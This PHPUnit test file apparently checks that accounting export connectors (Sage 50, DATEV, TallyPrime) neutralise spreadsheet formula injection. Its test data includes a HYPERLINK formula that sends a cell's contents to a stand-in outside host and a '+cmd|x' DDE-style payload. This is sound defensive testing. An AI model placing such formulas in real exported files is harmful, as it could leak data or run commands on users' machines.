<?php
/**
 * Hostile text in the export files: a name, a description or a reference that starts like a spreadsheet formula (`=`, `+`, `-`, `@`, a tab
 * or a carriage return), holds quotes, delimiters or line breaks, or is Arabic. Each file is read back with PHP's own parsers (fgetcsv,
 * libxml). The cell must be text, not a formula, and the original text must be recoverable by the format's rules: one space in front for
 * a text that starts like a formula (the accounting packages read it as padding), line breaks as spaces, quotes undone by the parser.
 *
 * @package Estasoft\SyncEngine\Tests
 */

declare(strict_types=1);

namespace Estasoft\SyncEngine\Tests\Unit\Connectors\ExportShared;

use Estasoft\SyncEngine\Connectors\Datev\DatevColumns;
use Estasoft\SyncEngine\Connectors\Datev\DatevConnector;
use Estasoft\SyncEngine\Connectors\Sage50\Sage50Connector;
use Estasoft\SyncEngine\Connectors\Sage50\Sage50Csv;
use Estasoft\SyncEngine\Connectors\Support\ConnectorDependencies;
use Estasoft\SyncEngine\Connectors\Tally\TallyConnector;
use Estasoft\SyncEngine\Domain\Connection;
use Estasoft\SyncEngine\Tests\Support\FakeExportKit;
use PHPUnit\Framework\TestCase;

/**
 * @covers \Estasoft\SyncEngine\Connectors\ExportShared\SafeText
 * @covers \Estasoft\SyncEngine\Connectors\Sage50\Sage50Csv
 * @covers \Estasoft\SyncEngine\Connectors\Datev\DatevColumns
 * @covers \Estasoft\SyncEngine\Connectors\Datev\DatevConnector
 */
final class HostileTextTest extends TestCase {

	/**
	 * Texts that numbers look like: a spreadsheet reads them as numbers, not formulas, and the writer leaves them alone.
	 *
	 * @var array<int,string>
	 */
	private const NUMBERS = array( '-12.50', '+3', '-1.234,50' );

	/**
	 * Temporary folder.
	 *
	 * @var string
	 */
	private string $dir = '';

	/**
	 * Services.
	 *
	 * @var ConnectorDependencies
	 */
	private ConnectorDependencies $deps;

	/**
	 * Fresh folder.
	 */
	protected function setUp(): void {
		$this->dir  = FakeExportKit::folder( 'hostile' );
		$this->deps = FakeExportKit::deps( $this->dir );
	}

	/**
	 * Remove the folder.
	 */
	protected function tearDown(): void {
		FakeExportKit::remove( $this->dir );
	}

	/**
	 * The hostile texts, as they are typed.
	 *
	 * @return array<string,array{0:string}>
	 */
	public static function texts(): array {
		return array(
			'equals formula'        => array( '=HYPERLINK("http://e.x/"&A1)' ),
			'plus formula'          => array( '+1+1' ),
			'minus formula'         => array( '-2+3' ),
			'at function'           => array( '@SUM(1,1)' ),
			'tab then formula'      => array( "\t=1+1" ),
			'carriage return first' => array( "\r=1+1" ),
			'quotes and delimiters' => array( 'Say "hi", then; "bye"' ),
			'line breaks'           => array( "Line one\nLine two\r\nLine three" ),
			'arabic after equals'   => array( '=مرحبا بالعالم' ),
			'arabic with comma'     => array( 'ليلى حداد، الرياض' ),
			'german and nordic'     => array( 'Ørsted Åse Müller ß' ),
			'plain negative number' => array( '-12.50' ),
			'plain positive number' => array( '+3' ),
			'thousands number'      => array( '-1.234,50' ),
			'leading space'         => array( ' =1+1' ),
		);
	}

	/**
	 * What the order path does with a text before it is written: one line, white space collapsed, ends trimmed.
	 *
	 * @param string $text Typed text.
	 */
	private function oneLine( string $text ): string {
		return trim( (string) preg_replace( '/[\s\x{A0}\x{2028}\x{2029}]+/u', ' ', $text ) );
	}

	/**
	 * What the file must hold for a text, by the format's rules: a text that starts like a formula and is not a plain number has one space
	 * in front; a text longer than the field is shortened with three dots inside the limit.
	 *
	 * @param string $line  Text that is already one line.
	 * @param int    $limit Field length.
	 */
	private function expected( string $line, int $limit = 1000 ): string {
		if ( '' !== $line && 1 === preg_match( '/^[=+\-@\t\r]/', $line ) && ! in_array( $line, self::NUMBERS, true ) ) {
			$line = ' ' . $line;
		}
		if ( mb_strlen( $line ) > $limit ) {
			$line = rtrim( mb_substr( $line, 0, $limit - 3 ) ) . '...';
		}
		return $line;
	}

	/**
	 * Whether a spreadsheet would run the cell as a formula.
	 *
	 * @param string $cell Cell text.
	 */
	private function runsAsFormula( string $cell ): bool {
		return '' !== $cell && 1 === preg_match( '/^[=+\-@\t\r]/', $cell ) && ! in_array( $cell, self::NUMBERS, true );
	}

	/**
	 * Records of a delimited text, read with fgetcsv.
	 *
	 * @param string $text      UTF-8 text.
	 * @param string $delimiter Delimiter.
	 * @return array<int,array<int,string>>
	 */
	private function parse( string $text, string $delimiter ): array {
		$rows = array();
		$fh   = fopen( 'php://memory', 'w+' );
		fwrite( $fh, $text );
		rewind( $fh );
		while ( false !== ( $row = fgetcsv( $fh, 0, $delimiter, '"', '' ) ) ) {
			$rows[] = array_map( 'strval', $row );
		}
		fclose( $fh );
		return $rows;
	}

	/**
	 * The text of a UTF-8 file made with a byte order mark.
	 *
	 * @param string $bytes File bytes.
	 */
	private function bomText( string $bytes ): string {
		$this->assertSame( "\xEF\xBB\xBF", substr( $bytes, 0, 3 ) );
		return substr( $bytes, 3 );
	}

	/**
	 * An order with the hostile text in the product name, the reference and the customer name.
	 *
	 * @param string $number   Order number.
	 * @param string $text     Hostile text.
	 * @param string $currency Currency of the books.
	 * @param string $code     Tax code.
	 * @return array<string,mixed>
	 */
	private function order( string $number, string $text, string $currency, string $code ): array {
		$payload                              = FakeExportKit::order( $number );
		$payload['document']['currency']      = $currency;
		$payload['document']['reference']     = $text;
		$payload['customer']['name']          = $text;
		$payload['line'][0]['name']           = $text;
		$payload['line'][0]['tax_code']       = $code;
		$payload['line'][1]['tax_code']       = $code;
		$payload['shipping'][0]['tax_code']   = $code;
		return $payload;
	}

	/**
	 * Send one order for each hostile text through a connector, in the order of the data set.
	 *
	 * @param object     $connector  Connector.
	 * @param Connection $connection Connection.
	 * @param string     $currency   Currency.
	 * @param string     $code       Tax code.
	 * @return array<int,string> The hostile texts, by position; order numbers are 9000 plus the position.
	 */
	private function sendAll( object $connector, Connection $connection, string $currency, string $code ): array {
		$texts = array_map( static fn( array $set ): string => $set[0], array_values( self::texts() ) );
		foreach ( $texts as $i => $text ) {
			$number = (string) ( 9000 + $i );
			$result = $connector->send( $connection, FakeExportKit::item( $i + 1, $number ), $this->order( $number, $text, $currency, $code ) );
			$this->assertTrue( $result->isSuccess() );
		}
		return $texts;
	}

	/**
	 * The writer helpers on their own: only the named columns of a Sage record are touched, whatever they hold.
	 */
	public function test_sage_line_changes_only_the_text_columns(): void {
		$line = Sage50Csv::line( array( 'SI', '=ACCT', '4000', '-5', '02/11/2026', '=1+1', '=HYPERLINK("x")', '-21.50', 'T1', '+3' ), array( 5, 6 ) );
		$row  = $this->parse( $line . "\r\n", ',' );
		$this->assertCount( 1, $row );
		$this->assertSame( 'SI', $row[0][0] );
		$this->assertSame( '=ACCT', $row[0][1], 'An account reference is a code and stays as it is.' );
		$this->assertSame( '4000', $row[0][2] );
		$this->assertSame( '-5', $row[0][3] );
		$this->assertSame( '02/11/2026', $row[0][4] );
		$this->assertSame( ' =1+1', $row[0][5] );
		$this->assertSame( ' =HYPERLINK("x")', $row[0][6] );
		$this->assertSame( '-21.50', $row[0][7], 'An amount stays an amount.' );
		$this->assertSame( 'T1', $row[0][8] );
		$this->assertSame( '+3', $row[0][9] );
		$this->assertStringNotContainsString( "\n", $line );
	}

	/**
	 * Whatever is in a text column, it is one cell on one line, and the parser gives the text back.
	 *
	 * @dataProvider texts
	 *
	 * @param string $text Hostile text.
	 */
	public function test_sage_line_round_trip( string $text ): void {
		$line = Sage50Csv::line( array( 'SI', $text, 'after' ), array( 1 ) );
		$rows = $this->parse( $line . "\r\n", ',' );
		$this->assertCount( 1, $rows, 'One record, however many line breaks the text had.' );
		$this->assertCount( 3, $rows[0] );
		$this->assertSame( 'after', $rows[0][2] );
		$flat = (string) preg_replace( '/\R/u', ' ', $text );
		$this->assertFalse( $this->runsAsFormula( $rows[0][1] ), 'The cell is text.' );
		$this->assertSame( $this->expected( $flat ), $rows[0][1] );
	}

	/**
	 * The DATEV record changes only the text columns; accounts, amounts, dates and keys are written as they are.
	 */
	public function test_datev_record_changes_only_the_text_columns(): void {
		$record = DatevColumns::record(
			array(
				DatevColumns::UMSATZ        => '123,45',
				DatevColumns::SOLL_HABEN    => 'S',
				DatevColumns::KONTO         => '10000',
				DatevColumns::GEGENKONTO    => '8400',
				DatevColumns::BU_SCHLUESSEL => '3',
				DatevColumns::BELEGDATUM    => '0211',
				DatevColumns::BELEGFELD_1   => '=1+1',
				DatevColumns::BUCHUNGSTEXT  => '=HYPERLINK("http://e.x/")',
			)
		);
		$fields = $this->parse( $record . "\r\n", ';' )[0];
		$this->assertCount( 125, $fields );
		$this->assertSame( '123,45', $fields[0] );
		$this->assertSame( 'S', $fields[1] );
		$this->assertSame( '10000', $fields[6] );
		$this->assertSame( '8400', $fields[7] );
		$this->assertSame( '3', $fields[8] );
		$this->assertSame( '0211', $fields[9] );
		$this->assertSame( ' =1+1', $fields[10] );
		$this->assertSame( ' =HYPERLINK("http://e.x/")', $fields[13] );
		$this->assertStringContainsString( ';" =HYPERLINK(""http://e.x/"")";', $record, 'Text is always in quotes, inner quotes doubled.' );
	}

	/**
	 * A DATEV text column keeps its quotes, semicolons, line breaks and Arabic text through the parser.
	 *
	 * @dataProvider texts
	 *
	 * @param string $text Hostile text.
	 */
	public function test_datev_record_round_trip( string $text ): void {
		$record = DatevColumns::record( array( DatevColumns::BUCHUNGSTEXT => $text, DatevColumns::UMSATZ => '1,00' ) );
		$rows   = $this->parse( $record . "\r\n", ';' );
		$this->assertCount( 1, $rows, 'One record.' );
		$this->assertCount( 125, $rows[0] );
		$this->assertSame( '1,00', $rows[0][0] );
		$flat = (string) preg_replace( '/\R/u', ' ', $text );
		$this->assertFalse( $this->runsAsFormula( $rows[0][13] ) );
		$this->assertSame( $this->expected( $flat ), $rows[0][13] );
	}

	/**
	 * A NUL byte never reaches the file.
	 */
	public function test_nul_bytes_are_removed(): void {
		$line = Sage50Csv::line( array( "A\0B", 'x' ), array( 0 ) );
		$this->assertSame( 'AB,x', $line );
	}

	/**
	 * Sage 50 UK: product name, reference and order number go through the connector and come back as text.
	 */
	public function test_sage_uk_file(): void {
		$connector = new Sage50Connector( $this->deps );
		$connection = FakeExportKit::connection( 'sage50-export', array( 'edition' => 'uk', 'currency' => 'GBP', 'header_row' => 'no', 'encoding' => 'utf-8-bom' ) );
		$texts     = $this->sendAll( $connector, $connection, 'GBP', 'T1' );
		$rows      = $this->parse( $this->bomText( FakeExportKit::bytes( $connector->finish( $this->deps->exports->openBatch( 7 ) ) ) ), ',' );
		$this->assertCount( 3 * count( $texts ), $rows, 'Three rows for each order, no extra record from a line break.' );
		foreach ( $texts as $i => $text ) {
			$row = $rows[ 3 * $i ];
			$this->assertCount( 13, $row );
			$this->assertSame( (string) ( 9000 + $i ), $row[5] );
			$line = $this->oneLine( $text );
			$this->assertFalse( $this->runsAsFormula( $row[6] ), 'Details of ' . $i );
			$this->assertFalse( $this->runsAsFormula( $row[11] ), 'Extra Reference of ' . $i );
			$this->assertSame( $this->expected( $line, 60 ), $row[6] );
			$this->assertSame( $this->expected( $line, 30 ), $row[11] );
			$this->assertLessThanOrEqual( 30, mb_strlen( $row[11] ) );
		}
	}

	/**
	 * Sage 50 UK: an order number that starts like a formula is neutralised in Reference, within the 30 characters.
	 */
	public function test_sage_uk_order_number_and_long_reference(): void {
		$connector  = new Sage50Connector( $this->deps );
		$connection = FakeExportKit::connection( 'sage50-export', array( 'edition' => 'uk', 'currency' => 'GBP', 'header_row' => 'no' ) );
		$payload    = $this->order( '=1+1', 'ok', 'GBP', 'T1' );
		$payload['document']['reference'] = '=' . str_repeat( 'A', 29 );
		$this->assertTrue( $connector->send( $connection, FakeExportKit::item( 1, '1' ), $payload )->isSuccess() );
		$rows = $this->parse( mb_convert_encoding( FakeExportKit::bytes( $connector->finish( $this->deps->exports->openBatch( 7 ) ) ), 'UTF-8', 'Windows-1252' ), ',' );
		$this->assertSame( ' =1+1', $rows[0][5] );
		$this->assertSame( ' =' . str_repeat( 'A', 25 ) . '...', $rows[0][11], 'The space counts toward the 30 characters; a longer text is cut inside the limit.' );
		$this->assertSame( 30, mb_strlen( $rows[0][11] ) );
	}

	/**
	 * Sage 50 US: description, customer PO and invoice number.
	 */
	public function test_sage_us_file(): void {
		$connector  = new Sage50Connector( $this->deps );
		$connection = FakeExportKit::connection(
			'sage50-export',
			array(
				'edition'        => 'us',
				'currency'       => 'USD',
				'ar_account'     => '11000',
				'sales_account'  => '40000',
				'tax_gl_account' => '23000',
				'customer_id'    => 'WEB',
				'header_row'     => 'yes',
				'encoding'       => 'utf-8-bom',
			)
		);
		$texts      = $this->sendAll( $connector, $connection, 'USD', 'STATE' );
		$rows       = $this->parse( $this->bomText( FakeExportKit::bytes( $connector->finish( $this->deps->exports->openBatch( 7 ) ) ) ), ',' );
		$this->assertSame( 'Invoice/CM #', $rows[0][1], 'The heading row comes first.' );
		$rows = array_slice( $rows, 1 );
		$seen = array();
		foreach ( $rows as $row ) {
			$this->assertCount( 20, $row );
			if ( ! isset( $seen[ $row[1] ] ) ) {
				$seen[ $row[1] ] = $row;
			}
		}
		$this->assertSame( array_map( static fn( int $i ): string => (string) ( 9000 + $i ), array_keys( $texts ) ), array_map( 'strval', array_keys( $seen ) ) );
		foreach ( $texts as $i => $text ) {
			$row  = $seen[ (string) ( 9000 + $i ) ];
			$line = $this->oneLine( $text );
			$this->assertFalse( $this->runsAsFormula( $row[6] ), 'Customer PO of ' . $i );
			$this->assertFalse( $this->runsAsFormula( $row[12] ), 'Description of ' . $i );
			$this->assertSame( $this->expected( $line, 20 ), $row[6] );
			$this->assertSame( $this->expected( str_replace( '"', "'", $line ), 160 ), $row[12] );
			$this->assertSame( 'WEB', $row[0], 'The customer ID is a code and stays as it is.' );
			$this->assertSame( '40000', $row[13] );
		}
	}

	/**
	 * DATEV: the reference and the booking text come back as text, in Windows-1252 and in UTF-8.
	 */
	public function test_datev_file(): void {
		foreach ( array( 'utf-8-bom', 'windows-1252' ) as $encoding ) {
			$dir  = FakeExportKit::folder( 'hostile-datev' );
			$deps = FakeExportKit::deps( $dir );
			$connector  = new DatevConnector( $deps );
			$connection = FakeExportKit::connection( 'datev-export', array( 'consultant_number' => 29098, 'client_number' => 55003, 'encoding' => $encoding ) );
			$texts      = array_map( static fn( array $set ): string => $set[0], array_values( self::texts() ) );
			foreach ( $texts as $i => $text ) {
				$number  = (string) ( 9000 + $i );
				$payload = $this->order( $number, $text, 'EUR', '8400' );
				$this->assertTrue( $connector->send( $connection, FakeExportKit::item( $i + 1, $number ), $payload )->isSuccess() );
			}
			$bytes = FakeExportKit::bytes( $connector->finish( $deps->exports->openBatch( 7 ) ) );
			$text  = 'utf-8-bom' === $encoding ? $this->bomText( $bytes ) : mb_convert_encoding( $bytes, 'UTF-8', 'Windows-1252' );
			$rows  = $this->parse( $text, ';' );
			$this->assertCount( 2 + count( $texts ), $rows, 'Header, names and one posting for each order: no extra record from a line break.' );
			foreach ( $texts as $i => $original ) {
				$row  = $rows[ 2 + $i ];
				$line = $this->oneLine( $original );
				if ( 'windows-1252' === $encoding && 1 === preg_match( '/\p{Arabic}/u', $line ) ) {
					// Windows-1252 cannot hold Arabic: the letters become question marks, and the cell is still text.
					$this->assertFalse( $this->runsAsFormula( $row[48] ) );
					$this->assertSame( mb_strlen( $this->expected( $line, 210 ) ), mb_strlen( $row[48] ) );
					continue;
				}
				$this->assertSame( (string) ( 9000 + $i ), $row[10], 'Belegfeld 1' );
				$this->assertFalse( $this->runsAsFormula( $row[48] ), 'Inhalt of ' . $i );
				$this->assertSame( $this->expected( $line, 210 ), $row[48] );
				$this->assertSame( 'WC ' . ( 9000 + $i ) . ' ' . $line, $row[13], 'The booking text starts with WC and cannot start a formula.' );
			}
			FakeExportKit::remove( $dir );
		}
	}

	/**
	 * DATEV: Belegfeld 1 keeps the characters DATEV allows and never starts with a sign, an equals sign or an at sign.
	 */
	public function test_datev_belegfeld_never_starts_like_a_formula(): void {
		$connector  = new DatevConnector( $this->deps );
		$connection = FakeExportKit::connection( 'datev-export', array( 'consultant_number' => 29098, 'client_number' => 55003 ) );
		$numbers    = array( '=1+1', '+1+1', '-2+3', '@SUM(1,1)', '+cmd|x', '--7' );
		foreach ( $numbers as $i => $number ) {
			$this->assertTrue( $connector->send( $connection, FakeExportKit::item( $i + 1, 'n' . $i ), $this->order( $number, 'ok', 'EUR', '8400' ) )->isSuccess() );
		}
		$batch = $this->deps->exports->openBatch( 7 );
		$file  = $connector->finish( $batch );
		$rows  = $this->parse( mb_convert_encoding( FakeExportKit::bytes( $file ), 'UTF-8', 'Windows-1252' ), ';' );
		$this->assertCount( 2 + count( $numbers ), $rows );
		for ( $i = 0; $i < count( $numbers ); $i++ ) {
			$belegfeld = $rows[ 2 + $i ][10];
			$this->assertMatchesRegularExpression( '#^[A-Za-z0-9$&%*][A-Za-z0-9$&%*+\-/]*$#', $belegfeld, 'Belegfeld 1 of ' . $numbers[ $i ] );
		}
		$this->assertSame( array(), $batch->leftOut(), 'Nothing is left out for this.' );
	}

	/**
	 * DATEV header: the exported-by name comes from the settings and is text too, within its 25 characters.
	 */
	public function test_datev_header_exported_by(): void {
		$connector  = new DatevConnector( $this->deps );
		$queued     = FakeExportKit::connection( 'datev-export', array( 'consultant_number' => 29098, 'client_number' => 55003 ) );
		$connector->send( $queued, FakeExportKit::item( 1, '1' ), $this->order( '1001', 'ok', 'EUR', '8400' ) );
		foreach ( array( '=HYPERLINK("x")', '@name', '+49 170 1234', 'ليلى حداد' ) as $name ) {
			$now = FakeExportKit::connection( 'datev-export', array( 'consultant_number' => 29098, 'client_number' => 55003, 'exported_by' => $name, 'encoding' => 'utf-8-bom' ) );
			$batch = $this->deps->exports->openBatch( 7 );
			$batch->forConnection( $now );
			$rows = $this->parse( $this->bomText( FakeExportKit::bytes( $connector->finish( $batch ) ) ), ';' );
			$cell = $rows[0][8];
			$this->assertFalse( $this->runsAsFormula( $cell ), $name );
			$this->assertSame( $this->expected( $this->oneLine( $name ), 25 ), $cell );
			$this->assertLessThanOrEqual( 25, mb_strlen( $cell ) );
			$this->assertCount( 31, $rows[0] );
		}
	}

	/**
	 * TallyPrime is XML: text is escaped, not neutralised, and every hostile text comes back unchanged from libxml (a leading `=` means
	 * nothing in XML). The masters list, a plain text file, indents every name so no line starts like a formula.
	 */
	public function test_tally_file(): void {
		$connector  = new TallyConnector( $this->deps );
		$connection = FakeExportKit::connection(
			'tallyprime-export',
			array(
				'company'              => '=Company & "Sons" <LLC>',
				'currency'             => 'AED',
				'customer_ledger_mode' => 'per_customer',
				'stock_item_source'    => 'name',
				'encoding'             => 'utf-8',
			)
		);
		$texts      = $this->sendAll( $connector, $connection, 'AED', 'Output VAT 5%' );
		$file       = $connector->finish( $this->deps->exports->openBatch( 7 ) );
		$dom        = new \DOMDocument();
		$this->assertTrue( $dom->loadXML( FakeExportKit::bytes( $file ) ), 'The file is well-formed XML.' );
		$xp = new \DOMXPath( $dom );
		$this->assertSame( '=Company & "Sons" <LLC>', $xp->evaluate( 'string(//SVCURRENTCOMPANY)' ) );
		$vouchers = $xp->query( '//VOUCHER' );
		$this->assertSame( count( $texts ), $vouchers->length );
		foreach ( $texts as $i => $text ) {
			$voucher = $vouchers->item( $i );
			$line    = $this->oneLine( $text );
			$this->assertSame( (string) ( 9000 + $i ), $xp->evaluate( 'string(VOUCHERNUMBER)', $voucher ) );
			$this->assertSame( $line, $xp->evaluate( 'string((ALLINVENTORYENTRIES.LIST/STOCKITEMNAME)[1])', $voucher ), 'Stock item of ' . $i );
			$this->assertStringContainsString( $line, $xp->evaluate( 'string(NARRATION)', $voucher ), 'Narration of ' . $i );
		}
		$masters = $connector->mastersList( $this->deps->exports->openBatch( 7 ) );
		foreach ( explode( "\n", $masters ) as $row ) {
			if ( '' !== $row ) {
				$this->assertFalse( $this->runsAsFormula( $row ), 'Masters list line: ' . $row );
			}
		}
	}
}
